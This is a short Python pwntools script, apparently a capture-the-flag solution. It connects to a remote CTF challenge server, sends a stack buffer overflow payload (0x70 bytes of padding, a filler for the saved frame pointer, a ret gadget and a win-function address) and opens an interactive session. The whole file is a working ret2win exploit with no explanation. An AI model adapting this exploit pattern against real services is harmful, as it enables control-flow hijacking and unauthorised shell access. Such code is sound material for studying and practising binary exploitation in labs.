#Author:Mcpvioy
#-*- coding:utf-8 -*-
from pwn import *
io = remote('01.linux.challenges.ctf.thefewchosen.com',53501)

win = 0x04011b6
ret = 0x040101a
pl = b'a' * 0x70 + b'deadbeaf' + p64(ret) + p64(win)
io.recvline()
io.sendline(pl)
io.interactive()
